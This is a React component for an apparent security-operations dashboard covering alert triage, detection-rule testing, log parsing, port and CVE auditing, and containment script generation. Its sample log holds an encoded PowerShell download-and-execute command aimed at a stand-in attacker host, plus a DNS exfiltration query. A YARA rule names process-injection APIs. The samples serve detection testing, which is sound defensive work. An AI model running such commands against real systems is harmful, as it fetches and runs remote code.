import React, { useState, useEffect } from 'react';
import {
  Activity, ShieldAlert, Cpu, Terminal, Globe, FileText, CheckCircle2,
  AlertTriangle, Play, Copy, RefreshCw, Layers, Crosshair, ArrowUpRight, Zap
} from 'lucide-react';
import { analystAPI } from '../services/api';

const DEFAULT_YARA = `rule Detect_Suspicious_Powershell {
    meta:
        description = "Detects obfuscated PowerShell execution with Win32 APIs"
        author = "SENTINEL Threat Analyst"
        severity = "HIGH"
    strings:
        $s1 = "VirtualAllocEx" ascii wide
        $s2 = "WriteProcessMemory" ascii wide
        $s3 = "CreateRemoteThread" ascii wide
        $enc = "-enc" ascii wide nocase
    condition:
        ($enc and 2 of ($s*))
}`;

const DEFAULT_SAMPLE_LOG = `2026-08-03T11:42:10Z auth-prod-01 sshd[9014]: Failed password for root from 185.220.101.5 port 42100 ssh2
2026-08-03T11:42:11Z auth-prod-01 sshd[9015]: Failed password for root from 185.220.101.5 port 42102 ssh2
2026-08-03T11:42:12Z auth-prod-01 sshd[9016]: Failed password for admin from 185.220.101.5 port 42104 ssh2
2026-08-03T11:42:15Z auth-prod-01 sshd[9019]: Failed password for invalid user oracle from 185.220.101.5 port 42110 ssh2
2026-08-03T11:48:35Z wkstn-finance-08 EventID:4104 powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYQB0AHQAYQBjAGsAZQByAC0AYwAyAC0AbgBlAHQALgB4AHkAegAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA VirtualAllocEx WriteProcessMemory
2026-08-03T12:01:04Z srv-file-03 dnsmasq[1022]: query[A] payload-base64-chunk-01.ns1.attacker-c2-net.xyz from 10.0.2.89`;

export default function AnalystPage() {
  const [activeTab, setActiveTab] = useState('triage');

  // Tab 1: Alert Triage Queue State
  const [alerts, setAlerts] = useState([]);
  const [loadingAlerts, setLoadingAlerts] = useState(true);
  const [triageStatus, setTriageStatus] = useState('');

  // Tab 2: Threat Hunting State
  const [ruleType, setRuleType] = useState('YARA');
  const [ruleContent, setRuleContent] = useState(DEFAULT_YARA);
  const [sampleText, setSampleText] = useState(DEFAULT_SAMPLE_LOG);
  const [huntingResult, setHuntingResult] = useState(null);
  const [loadingHunt, setLoadingHunt] = useState(false);

  // Tab 3: SIEM Log Parser State
  const [logContent, setLogContent] = useState(DEFAULT_SAMPLE_LOG);
  const [parsedLogResult, setParsedLogResult] = useState(null);
  const [loadingParse, setLoadingParse] = useState(false);

  // Tab 4: Attack Surface Scanner State
  const [targetAsset, setTargetAsset] = useState('auth-prod-01.internal');
  const [scanResult, setScanResult] = useState(null);
  const [loadingScan, setLoadingScan] = useState(false);

  // Tab 5: SOAR Playbook State
  const [playbookType, setPlaybookType] = useState('BLOCK_IP');
  const [playbookTarget, setPlaybookTarget] = useState('185.220.101.5');
  const [playbookResult, setPlaybookResult] = useState(null);
  const [loadingPlaybook, setLoadingPlaybook] = useState(false);
  const [copiedPayload, setCopiedPayload] = useState(false);

  useEffect(() => {
    fetchAlerts();
  }, []);

  const fetchAlerts = async () => {
    setLoadingAlerts(true);
    try {
      const res = await analystAPI.getAlerts();
      setAlerts(res.data || []);
    } catch (e) {
      console.error(e);
    } finally {
      setLoadingAlerts(false);
    }
  };

  const handleTriageAction = async (alertId, action) => {
    try {
      const res = await analystAPI.triageAlert(alertId, action, `Action ${action} taken from Analyst Workspace.`);
      setTriageStatus(`Alert ${alertId}: ${res.data?.new_status}`);
      setTimeout(() => setTriageStatus(''), 4000);
      fetchAlerts();
    } catch (e) {
      alert("Failed to triage alert.");
    }
  };

  const handleTestRule = async () => {
    if (!ruleContent.trim() || !sampleText.trim()) return;
    setLoadingHunt(true);
    try {
      const res = await analystAPI.testRule({
        rule_type: ruleType,
        rule_content: ruleContent,
        sample_text: sampleText
      });
      setHuntingResult(res.data);
    } catch (e) {
      alert("Failed to test rule.");
    } finally {
      setLoadingHunt(false);
    }
  };

  const handleParseLogs = async () => {
    if (!logContent.trim()) return;
    setLoadingParse(true);
    try {
      const res = await analystAPI.parseLogs({ log_content: logContent });
      setParsedLogResult(res.data);
    } catch (e) {
      alert("Failed to parse logs.");
    } finally {
      setLoadingParse(false);
    }
  };

  const handleScanAttackSurface = async () => {
    if (!targetAsset.trim()) return;
    setLoadingScan(true);
    try {
      const res = await analystAPI.scanAttackSurface({ target: targetAsset });
      setScanResult(res.data);
    } catch (e) {
      alert("Failed to scan attack surface.");
    } finally {
      setLoadingScan(false);
    }
  };

  const handleGeneratePlaybook = async () => {
    if (!playbookTarget.trim()) return;
    setLoadingPlaybook(true);
    try {
      const res = await analystAPI.generatePlaybook({
        playbook_type: playbookType,
        target_value: playbookTarget
      });
      setPlaybookResult(res.data);
    } catch (e) {
      alert("Failed to generate containment playbook.");
    } finally {
      setLoadingPlaybook(false);
    }
  };

  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text);
    setCopiedPayload(true);
    setTimeout(() => setCopiedPayload(false), 2000);
  };

  return (
    <div className="p-6 space-y-6 font-sans max-w-7xl mx-auto">
      {/* Workspace Header */}
      <div className="border-b border-slate-800 pb-5">
        <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
          <div>
            <div className="flex items-center gap-2">
              <Crosshair className="w-6 h-6 text-cyan-400" />
              <h1 className="text-2xl font-mono font-bold text-slate-100">ANALYST SOC WORKSPACE</h1>
              <span className="px-2.5 py-0.5 rounded bg-cyan-950 border border-cyan-800 text-cyan-400 text-xs font-mono font-bold">
                REAL-TIME TRIAGE &amp; HUNTING
              </span>
            </div>
            <p className="text-xs font-mono text-slate-400 mt-1">
              Rapid Alert Processing • YARA/Sigma Rule Crafting • SIEM Log Parsing • Attack Surface Auditing • SOAR Containment Playbooks
            </p>
          </div>

          <div className="flex items-center gap-2">
            <button
              onClick={fetchAlerts}
              className="px-3 py-1.5 rounded-lg bg-slate-900 border border-slate-700 hover:bg-slate-800 text-slate-300 font-mono text-xs flex items-center gap-1.5 transition-all"
            >
              <RefreshCw className={`w-3.5 h-3.5 ${loadingAlerts ? 'animate-spin' : ''}`} /> REFRESH TRIAGE
            </button>
          </div>
        </div>

        {/* Tab Navigation */}
        <div className="flex flex-wrap gap-2 mt-6">
          {[
            { id: 'triage', label: '⚡ ALERT TRIAGE QUEUE', icon: Activity },
            { id: 'hunting', label: '🏹 THREAT HUNTING WORKBENCH', icon: Terminal },
            { id: 'logs', label: '📜 SIEM LOG PARSER', icon: FileText },
            { id: 'attack', label: '🌐 ATTACK SURFACE SCANNER', icon: Globe },
            { id: 'soar', label: '🤖 SOAR PLAYBOOK ENGINE', icon: Zap },
          ].map((tab) => {
            const Icon = tab.icon;
            const isActive = activeTab === tab.id;
            return (
              <button
                key={tab.id}
                onClick={() => setActiveTab(tab.id)}
                className={`flex items-center gap-2 px-4 py-2.5 rounded-xl font-mono text-xs font-bold transition-all ${
                  isActive
                    ? 'bg-cyan-500 text-black shadow-cyber-glow'
                    : 'bg-slate-900/80 border border-slate-800 text-slate-400 hover:text-slate-200 hover:bg-slate-800'
                }`}
              >
                <Icon className="w-4 h-4" />
                {tab.label}
              </button>
            );
          })}
        </div>
      </div>

      {/* Status Alert Banner */}
      {triageStatus && (
        <div className="p-3 bg-emerald-950/60 border border-emerald-500 text-emerald-400 rounded-xl font-mono text-xs flex items-center gap-2">
          <CheckCircle2 className="w-4 h-4" /> {triageStatus}
        </div>
      )}

      {/* TAB 1: ALERT TRIAGE QUEUE */}
      {activeTab === 'triage' && (
        <div className="space-y-4 font-mono">
          <div className="flex items-center justify-between">
            <h3 className="text-sm font-bold text-slate-200 flex items-center gap-2">
              <ShieldAlert className="w-4 h-4 text-cyan-400" />
              ACTIVE SOC TRIAGE QUEUE ({alerts.length})
            </h3>
            <p className="text-[11px] text-slate-500">Fast 30-Second Triage: Dismiss False Positives or Escalate to Case</p>
          </div>

          <div className="grid grid-cols-1 gap-4">
            {loadingAlerts ? (
              <div className="p-12 text-center text-slate-500 text-xs">LOADING TRIAGE QUEUE...</div>
            ) : alerts.map((alt) => {
              const sevColor = alt.severity === 'CRITICAL' ? 'border-rose-900/60 bg-rose-950/20 text-rose-400' : alt.severity === 'HIGH' ? 'border-orange-900/60 bg-orange-950/20 text-orange-400' : 'border-yellow-900/60 bg-yellow-950/20 text-yellow-400';
              const isDone = alt.status !== 'OPEN';

              return (
                <div key={alt.id} className={`p-5 rounded-xl border bg-slate-900/60 flex flex-col md:flex-row md:items-center justify-between gap-4 ${sevColor}`}>
                  <div className="space-y-1.5 flex-1 min-w-0">
                    <div className="flex items-center gap-2 flex-wrap">
                      <span className="font-bold text-slate-100 text-sm">{alt.id}</span>
                      <span className={`px-2 py-0.5 rounded text-[10px] font-bold border ${sevColor}`}>
                        {alt.severity}
                      </span>
                      <span className="px-2 py-0.5 rounded bg-slate-800 text-slate-300 border border-slate-700 text-[10px]">
                        {alt.category}
                      </span>
                      <span className="text-[10px] text-slate-500">{alt.timestamp}</span>
                    </div>

                    <h4 className="text-xs font-bold text-slate-200">{alt.title}</h4>
                    <p className="text-[11px] text-slate-400 leading-relaxed">{alt.details}</p>

                    <div className="flex items-center gap-4 text-[10px] text-slate-500 pt-1">
                      <span>SOURCE IP: <strong className="text-cyan-400">{alt.source_ip}</strong></span>
                      <span>TARGET ASSET: <strong className="text-slate-300">{alt.target_asset}</strong></span>
                      <span>LOG: <strong>{alt.source}</strong></span>
                    </div>
                  </div>

                  <div className="flex items-center gap-2 shrink-0">
                    {isDone ? (
                      <span className="px-3 py-1.5 rounded-lg bg-slate-800 border border-slate-700 text-slate-400 text-xs font-bold uppercase">
                        {alt.status}
                      </span>
                    ) : (
                      <>
                        <button
                          onClick={() => handleTriageAction(alt.id, 'FALSE_POSITIVE')}
                          className="px-3 py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-300 border border-slate-700 text-xs font-bold transition-all"
                        >
                          FALSE POSITIVE
                        </button>
                        <button
                          onClick={() => handleTriageAction(alt.id, 'CONTAIN')}
                          className="px-3 py-1.5 rounded-lg bg-orange-950 hover:bg-orange-900 text-orange-300 border border-orange-800 text-xs font-bold transition-all"
                        >
                          CONTAIN IP
                        </button>
                        <button
                          onClick={() => handleTriageAction(alt.id, 'ESCALATE')}
                          className="px-3.5 py-1.5 rounded-lg bg-cyan-500 hover:bg-cyan-400 text-black text-xs font-bold transition-all flex items-center gap-1"
                        >
                          ESCALATE <ArrowUpRight className="w-3.5 h-3.5" />
                        </button>
                      </>
                    )}
                  </div>
                </div>
              );
            })}
          </div>
        </div>
      )}

      {/* TAB 2: THREAT HUNTING WORKBENCH */}
      {activeTab === 'hunting' && (
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 font-mono">
          {/* Rule Editor */}
          <div className="cyber-card p-5 rounded-xl border border-slate-800 space-y-4">
            <div className="flex items-center justify-between">
              <h3 className="text-xs font-bold text-slate-200 flex items-center gap-2">
                <Terminal className="w-4 h-4 text-cyan-400" />
                DETECTION RULE BUILDER ({ruleType})
              </h3>
              <div className="flex gap-1">
                {['YARA', 'SIGMA'].map(t => (
                  <button
                    key={t}
                    onClick={() => setRuleType(t)}
                    className={`px-2.5 py-1 text-[10px] font-bold rounded border ${
                      ruleType === t ? 'bg-cyan-500 text-black border-cyan-400' : 'bg-slate-900 text-slate-400 border-slate-800'
                    }`}
                  >
                    {t}
                  </button>
                ))}
              </div>
            </div>

            <div>
              <label className="block text-[10px] text-slate-500 mb-1">RULE CODE</label>
              <textarea
                rows={12}
                value={ruleContent}
                onChange={(e) => setRuleContent(e.target.value)}
                className="w-full bg-slate-950 border border-slate-800 rounded-lg p-3 text-xs text-cyan-300 font-mono focus:outline-none focus:border-cyan-500 resize-none leading-relaxed"
              />
            </div>

            <div>
              <label className="block text-[10px] text-slate-500 mb-1">TEST PAYLOAD / LOG SAMPLE</label>
              <textarea
                rows={4}
                value={sampleText}
                onChange={(e) => setSampleText(e.target.value)}
                className="w-full bg-slate-950 border border-slate-800 rounded-lg p-3 text-xs text-slate-300 font-mono focus:outline-none focus:border-cyan-500 resize-none"
              />
            </div>

            <button
              onClick={handleTestRule}
              disabled={loadingHunt}
              className="w-full py-2.5 bg-cyan-500 hover:bg-cyan-400 disabled:opacity-40 text-black font-bold rounded-lg text-xs flex items-center justify-center gap-2 shadow-cyber-glow transition-all"
            >
              <Play className="w-4 h-4" /> {loadingHunt ? 'TESTING RULE...' : `VALIDATE & TEST ${ruleType} RULE`}
            </button>
          </div>

          {/* Test Evaluation Results */}
          <div className="cyber-card p-5 rounded-xl border border-slate-800 space-y-4">
            <h3 className="text-xs font-bold text-slate-200 flex items-center gap-2">
              <CheckCircle2 className="w-4 h-4 text-emerald-400" />
              RULE EVALUATION RESULTS
            </h3>

            {!huntingResult ? (
              <div className="text-center py-20 text-slate-600 text-xs">
                Click "TEST RULE" to evaluate your {ruleType} detection rule against the test payload sample.
              </div>
            ) : (
              <div className="space-y-4">
                <div className={`p-4 rounded-xl border flex items-center justify-between ${
                  huntingResult.status === 'MATCH_FOUND' ? 'bg-emerald-950/40 border-emerald-700/60 text-emerald-300' : 'bg-slate-900 border-slate-800 text-slate-400'
                }`}>
                  <div>
                    <p className="text-xs font-bold">{huntingResult.status === 'MATCH_FOUND' ? '✅ SIGNATURE MATCH DETECTED' : '❌ NO MATCH FOUND'}</p>
                    <p className="text-[10px] text-slate-500 mt-0.5">{huntingResult.match_count} signature patterns matched in sample</p>
                  </div>
                  <span className="text-[10px] px-2 py-1 bg-slate-950 rounded border border-slate-800 text-slate-400">{huntingResult.evaluated_at?.slice(11)}</span>
                </div>

                <div className="space-y-2">
                  <p className="text-[10px] text-slate-500 uppercase">MATCH DETAILS</p>
                  {huntingResult.matches.map((m, idx) => (
                    <div key={idx} className="p-3 bg-slate-950 border border-slate-800 rounded-lg text-xs text-slate-200">
                      • {m}
                    </div>
                  ))}
                </div>
              </div>
            )}
          </div>
        </div>
      )}

      {/* TAB 3: SIEM LOG PARSER */}
      {activeTab === 'logs' && (
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 font-mono">
          <div className="cyber-card p-5 rounded-xl border border-slate-800 space-y-4">
            <h3 className="text-xs font-bold text-slate-200 flex items-center gap-2">
              <FileText className="w-4 h-4 text-cyan-400" />
              SIEM LOG PARSER (.EVTX / SYSLOG / JSON)
            </h3>

            <div>
              <label className="block text-[10px] text-slate-500 mb-1">RAW LOG INPUT STREAM</label>
              <textarea
                rows={14}
                value={logContent}
                onChange={(e) => setLogContent(e.target.value)}
                className="w-full bg-slate-950 border border-slate-800 rounded-lg p-3 text-xs text-slate-200 font-mono focus:outline-none focus:border-cyan-500 resize-none leading-relaxed"
                placeholder="Paste raw log lines here..."
              />
            </div>

            <button
              onClick={handleParseLogs}
              disabled={loadingParse}
              className="w-full py-2.5 bg-cyan-500 hover:bg-cyan-400 disabled:opacity-40 text-black font-bold rounded-lg text-xs flex items-center justify-center gap-2 shadow-cyber-glow transition-all"
            >
              <Layers className="w-4 h-4" /> {loadingParse ? 'PARSING LOGS...' : 'PARSE LOG ANOMALIES'}
            </button>
          </div>

          <div className="cyber-card p-5 rounded-xl border border-slate-800 space-y-4">
            <h3 className="text-xs font-bold text-slate-200 flex items-center gap-2">
              <Activity className="w-4 h-4 text-cyan-400" />
              LOG ANOMALY PARSER OUTPUT
            </h3>

            {!parsedLogResult ? (
              <div className="text-center py-20 text-slate-600 text-xs">
                Paste log text and click "PARSE LOG ANOMALIES" to extract failed logins, PowerShell execution, and top IP talkers.
              </div>
            ) : (
              <div className="space-y-4">
                <div className="grid grid-cols-3 gap-3">
                  <div className="p-3 bg-slate-900 border border-slate-800 rounded-lg text-center">
                    <p className="text-lg font-bold text-slate-100">{parsedLogResult.total_log_lines_parsed}</p>
                    <p className="text-[10px] text-slate-500">LINES PARSED</p>
                  </div>
                  <div className="p-3 bg-slate-900 border border-slate-800 rounded-lg text-center">
                    <p className="text-lg font-bold text-rose-400">{parsedLogResult.failed_login_events}</p>
                    <p className="text-[10px] text-slate-500">FAILED LOGINS</p>
                  </div>
                  <div className="p-3 bg-slate-900 border border-slate-800 rounded-lg text-center">
                    <p className="text-lg font-bold text-purple-400">{parsedLogResult.suspicious_executions}</p>
                    <p className="text-[10px] text-slate-500">SHELL EXEC</p>
                  </div>
                </div>

                <div className="space-y-2">
                  <p className="text-[10px] text-slate-500 uppercase">DETECTED ANOMALIES</p>
                  {parsedLogResult.detected_anomalies.map((anom, idx) => (
                    <div key={idx} className="p-3 bg-slate-950 border border-slate-800 rounded-lg flex items-center justify-between text-xs">
                      <div>
                        <p className="font-bold text-cyan-400">{anom.type}</p>
                        <p className="text-slate-400 text-[11px] mt-0.5">{anom.description}</p>
                      </div>
                      <span className="px-2 py-0.5 rounded bg-rose-950 text-rose-400 text-[10px] font-bold border border-rose-800">
                        {anom.severity}
                      </span>
                    </div>
                  ))}
                </div>

                <div className="space-y-2">
                  <p className="text-[10px] text-slate-500 uppercase">TOP IP TALKERS</p>
                  <div className="space-y-1">
                    {parsedLogResult.top_ip_talkers.map((talker, idx) => (
                      <div key={idx} className="flex justify-between p-2 bg-slate-900 rounded border border-slate-800 text-xs">
                        <span className="text-cyan-400 font-bold">{talker.ip}</span>
                        <span className="text-slate-400">{talker.count} requests</span>
                      </div>
                    ))}
                  </div>
                </div>
              </div>
            )}
          </div>
        </div>
      )}

      {/* TAB 4: ATTACK SURFACE SCANNER */}
      {activeTab === 'attack' && (
        <div className="space-y-6 font-mono">
          <div className="cyber-card p-5 rounded-xl border border-slate-800 space-y-4">
            <h3 className="text-xs font-bold text-slate-200 flex items-center gap-2">
              <Globe className="w-4 h-4 text-cyan-400" />
              EXTERNAL ATTACK SURFACE &amp; CVE VULNERABILITY AUDITOR
            </h3>

            <div className="flex flex-col sm:flex-row gap-3">
              <input
                type="text"
                value={targetAsset}
                onChange={(e) => setTargetAsset(e.target.value)}
                placeholder="Enter domain or IP (e.g. auth-prod-01.internal)..."
                className="flex-1 bg-slate-950 border border-slate-800 rounded-lg px-4 py-2.5 text-xs text-slate-200 font-mono focus:outline-none focus:border-cyan-500"
              />
              <button
                onClick={handleScanAttackSurface}
                disabled={loadingScan}
                className="px-6 py-2.5 bg-cyan-500 hover:bg-cyan-400 disabled:opacity-40 text-black font-bold rounded-lg text-xs flex items-center justify-center gap-2 shadow-cyber-glow transition-all"
              >
                <Globe className="w-4 h-4" /> {loadingScan ? 'AUDITING...' : 'AUDIT ATTACK SURFACE'}
              </button>
            </div>
          </div>

          {scanResult && (
            <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
              <div className="cyber-card p-5 rounded-xl border border-slate-800 text-center flex flex-col justify-center items-center">
                <p className="text-[10px] text-slate-500 uppercase">SECURITY HEALTH GRADE</p>
                <h2 className={`text-6xl font-bold my-2 ${
                  scanResult.health_grade === 'A' ? 'text-emerald-400' : scanResult.health_grade === 'B' ? 'text-cyan-400' : scanResult.health_grade === 'C' ? 'text-yellow-400' : 'text-rose-400'
                }`}>
                  {scanResult.health_grade}
                </h2>
                <p className="text-xs text-slate-400">Risk Score: {scanResult.overall_risk_score}/100</p>
                <p className="text-[10px] text-cyan-400 mt-2">IP: {scanResult.resolved_ip}</p>
              </div>

              <div className="cyber-card p-5 rounded-xl border border-slate-800 space-y-3">
                <h4 className="text-xs font-bold text-slate-200">OPEN PORTS &amp; SERVICES</h4>
                <div className="space-y-2">
                  {scanResult.open_ports.map((p, idx) => (
                    <div key={idx} className="flex items-center justify-between p-2.5 bg-slate-950 rounded border border-slate-800 text-xs">
                      <div>
                        <span className="text-cyan-400 font-bold">PORT {p.port}</span>
                        <span className="text-slate-300 ml-2">{p.service}</span>
                      </div>
                      <span className={`text-[10px] font-bold px-2 py-0.5 rounded ${
                        p.risk === 'HIGH' ? 'bg-rose-950 text-rose-400' : p.risk === 'MEDIUM' ? 'bg-orange-950 text-orange-400' : 'bg-slate-800 text-slate-400'
                      }`}>
                        {p.risk} RISK
                      </span>
                    </div>
                  ))}
                </div>
              </div>

              <div className="cyber-card p-5 rounded-xl border border-slate-800 space-y-3">
                <h4 className="text-xs font-bold text-slate-200">CVE VULNERABILITY MATCHES</h4>
                <div className="space-y-2">
                  {scanResult.matching_cves.length === 0 ? (
                    <p className="text-slate-600 text-xs">No critical CVEs matched for open services.</p>
                  ) : scanResult.matching_cves.map((cve, idx) => (
                    <div key={idx} className="p-3 bg-slate-950 border border-slate-800 rounded-lg text-xs space-y-1">
                      <div className="flex justify-between font-bold">
                        <span className="text-rose-400">{cve.cve_id}</span>
                        <span className="text-rose-400">CVSS {cve.cvss_score}</span>
                      </div>
                      <p className="text-slate-200 text-[11px]">{cve.name}</p>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          )}
        </div>
      )}

      {/* TAB 5: SOAR PLAYBOOK ENGINE */}
      {activeTab === 'soar' && (
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 font-mono">
          <div className="cyber-card p-5 rounded-xl border border-slate-800 space-y-4">
            <h3 className="text-xs font-bold text-slate-200 flex items-center gap-2">
              <Zap className="w-4 h-4 text-cyan-400" />
              SOAR CONTAINMENT PLAYBOOK GENERATOR
            </h3>

            <div className="space-y-3">
              <div>
                <label className="block text-[10px] text-slate-500 mb-1">PLAYBOOK ACTION TYPE</label>
                <select
                  value={playbookType}
                  onChange={(e) => setPlaybookType(e.target.value)}
                  className="w-full bg-slate-950 border border-slate-800 rounded-lg px-3 py-2.5 text-xs text-slate-200 font-mono focus:outline-none focus:border-cyan-500"
                >
                  <option value="BLOCK_IP">BLOCK MALICIOUS IP (iptables / Windows Firewall)</option>
                  <option value="BLOCK_DOMAIN">DNS SINKHOLE DOMAIN (BIND / Hosts File)</option>
                  <option value="ISOLATE_ENDPOINT">NETWORK ISOLATE ENDPOINT HOST</option>
                  <option value="REVOKE_USER">REVOKE COMPROMISED USER SESSIONS</option>
                </select>
              </div>

              <div>
                <label className="block text-[10px] text-slate-500 mb-1">TARGET IP / DOMAIN / USERNAME</label>
                <input
                  type="text"
                  value={playbookTarget}
                  onChange={(e) => setPlaybookTarget(e.target.value)}
                  placeholder="e.g. 185.220.101.5 or attacker-c2.xyz..."
                  className="w-full bg-slate-950 border border-slate-800 rounded-lg px-3 py-2.5 text-xs text-slate-200 font-mono focus:outline-none focus:border-cyan-500"
                />
              </div>

              <button
                onClick={handleGeneratePlaybook}
                disabled={loadingPlaybook}
                className="w-full py-2.5 bg-cyan-500 hover:bg-cyan-400 disabled:opacity-40 text-black font-bold rounded-lg text-xs flex items-center justify-center gap-2 shadow-cyber-glow transition-all"
              >
                <Zap className="w-4 h-4" /> {loadingPlaybook ? 'GENERATING PAYLOAD...' : 'GENERATE CONTAINMENT PAYLOAD'}
              </button>
            </div>
          </div>

          <div className="cyber-card p-5 rounded-xl border border-slate-800 space-y-4">
            <h3 className="text-xs font-bold text-slate-200 flex items-center gap-2">
              <Terminal className="w-4 h-4 text-cyan-400" />
              CONTAINMENT SCRIPT PAYLOAD
            </h3>

            {!playbookResult ? (
              <div className="text-center py-20 text-slate-600 text-xs">
                Select a playbook action and click "GENERATE CONTAINMENT PAYLOAD" to get Linux &amp; Windows block scripts.
              </div>
            ) : (
              <div className="space-y-4">
                <div className="flex items-center justify-between">
                  <h4 className="text-xs font-bold text-cyan-400">{playbookResult.title}</h4>
                  <button
                    onClick={() => copyToClipboard(playbookResult.bash_payload + "\n\n" + playbookResult.powershell_payload)}
                    className="px-3 py-1 bg-slate-900 hover:bg-slate-800 text-slate-300 border border-slate-700 rounded text-[11px] flex items-center gap-1"
                  >
                    <Copy className="w-3 h-3" /> {copiedPayload ? 'COPIED!' : 'COPY PAYLOAD'}
                  </button>
                </div>

                <div>
                  <p className="text-[10px] text-slate-500 mb-1">LINUX / BASH PAYLOAD</p>
                  <pre className="bg-slate-950 p-3 rounded-lg border border-slate-800 text-xs text-emerald-400 font-mono overflow-x-auto">
                    {playbookResult.bash_payload}
                  </pre>
                </div>

                <div>
                  <p className="text-[10px] text-slate-500 mb-1">WINDOWS POWERSHELL PAYLOAD</p>
                  <pre className="bg-slate-950 p-3 rounded-lg border border-slate-800 text-xs text-blue-400 font-mono overflow-x-auto">
                    {playbookResult.powershell_payload}
                  </pre>
                </div>
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
}
